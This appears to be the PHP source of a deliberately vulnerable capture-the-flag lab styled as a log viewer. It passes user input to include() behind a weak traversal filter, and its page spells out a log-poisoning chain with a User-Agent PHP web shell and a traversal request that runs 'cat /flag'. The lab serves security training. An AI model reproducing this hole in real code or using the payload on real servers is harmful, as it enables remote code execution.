<?php
$page = $_GET['page'] ?? 'home';
$action = $_GET['action'] ?? '';

// Filter: remove some common attack patterns
$page = preg_replace('/\.\./', '', $page);
$page = preg_replace('/%00/', '', $page);
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Inclusion Hell - LFI + RCE</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0a; color: #f5f5f5; font-family: -apple-system, sans-serif; padding: 2rem; }
        .container { max-width: 800px; margin: 0 auto; }
        h1 { color: #ef4444; margin-bottom: 0.5rem; }
        .subtitle { color: #a1a1aa; margin-bottom: 2rem; font-size: 0.9rem; }
        .hint { background: #1a1a1a; border: 1px solid #27272a; border-radius: 8px; padding: 1rem; margin-bottom: 2rem; }
        .hint h3 { color: #ef4444; font-size: 0.9rem; margin-bottom: 0.5rem; }
        .hint p { color: #a1a1aa; font-size: 0.85rem; }
        .hint code { background: #27272a; padding: 0.2rem 0.4rem; border-radius: 4px; font-size: 0.85rem; }
        .tabs { display: flex; gap: 0.5rem; margin-bottom: 2rem; }
        .tab {
            padding: 0.5rem 1rem; background: #27272a; color: #f5f5f5; text-decoration: none;
            border-radius: 8px; font-size: 0.9rem;
        }
        .tab:hover { background: #3f3f46; }
        .tab.active { background: #ef4444; color: white; }
        .content {
            background: #1a1a1a; border: 1px solid #27272a; border-radius: 8px;
            padding: 2rem; margin-bottom: 2rem; min-height: 200px;
        }
        .content h2 { margin-bottom: 1rem; }
        .content p { color: #a1a1aa; line-height: 1.6; }
        .log-viewer {
            background: #0a0a0a; border: 1px solid #27272a; border-radius: 8px;
            padding: 1rem; margin-bottom: 2rem; font-family: monospace; font-size: 0.85rem;
            max-height: 300px; overflow-y: auto;
        }
        .log-line { margin-bottom: 0.25rem; }
        .log-line.error { color: #ef4444; }
        .log-line.info { color: #10b981; }
        .info { background: #1a0000; border: 1px solid #3f0000; border-radius: 8px; padding: 1rem; margin-top: 2rem; }
        .info h3 { color: #ef4444; font-size: 0.9rem; margin-bottom: 0.5rem; }
        .info p { color: #a1a1aa; font-size: 0.85rem; }
        .info code { background: #27272a; padding: 0.2rem 0.4rem; border-radius: 4px; font-size: 0.85rem; }
    </style>
</head>
<body>
    <div class="container">
        <h1>日志查看系统</h1>
        <p class="subtitle">系统日志分析 | CyberRange File Inclusion Hell Lab</p>

        <div class="hint">
            <h3>学习目标</h3>
            <p>这个靶场结合了文件包含和其他漏洞，需要链式攻击。</p>
            <p>日志查看功能可以包含日志文件，而日志文件中可以注入 PHP 代码。</p>
            <p>这是高级攻击技术：通过 LFI + 日志投毒实现 RCE。</p>
        </div>

        <div class="tabs">
            <a href="?page=home" class="tab <?php echo $page === 'home' ? 'active' : ''; ?>">首页</a>
            <a href="?page=logs/access.log" class="tab <?php echo $page === 'logs/access.log' ? 'active' : ''; ?>">访问日志</a>
            <a href="?page=logs/error.log" class="tab <?php echo $page === 'logs/error.log' ? 'active' : ''; ?>">错误日志</a>
        </div>

        <div class="content">
            <?php
            if ($action === 'view_log') {
                // VULNERABLE: Log file inclusion with path traversal bypass
                $log_file = "/var/log/apache2/" . $page;
                if (file_exists($log_file)) {
                    echo '<div class="log-viewer">';
                    $lines = file($log_file);
                    foreach ($lines as $line) {
                        if (strpos($line, 'error') !== false || strpos($line, 'Error') !== false) {
                            echo '<div class="log-line error">' . htmlspecialchars($line) . '</div>';
                        } else {
                            echo '<div class="log-line">' . htmlspecialchars($line) . '</div>';
                        }
                    }
                    echo '</div>';
                } else {
                    // Try direct inclusion (VULNERABLE)
                    include($page);
                }
            } else {
                // Home page
                echo '<h2>欢迎使用日志查看系统</h2>';
                echo '<p>请选择要查看的日志文件。</p>';
                echo '<p>系统会记录所有访问和错误日志。</p>';
            }
            ?>
        </div>

        <div class="info">
            <h3>攻击链</h3>
            <p><strong>步骤 1:</strong> 发现日志查看功能使用 <code>include()</code> 加载日志文件</p>
            <p><strong>步骤 2:</strong> 通过 User-Agent 注入 PHP 代码到访问日志：</p>
            <p><code>User-Agent: &lt;?php system($_GET['cmd']); ?&gt;</code></p>
            <p><strong>步骤 3:</strong> 访问任意页面让日志记录注入的代码</p>
            <p><strong>步骤 4:</strong> 使用 LFI 包含日志文件并执行注入的代码：</p>
            <p><code>?page=../../../var/log/apache2/access.log&cmd=cat /flag</code></p>
            <p>flag 格式: <code>CR{...}</code> (在 /flag 文件中)</p>
        </div>
    </div>
</body>
</html>
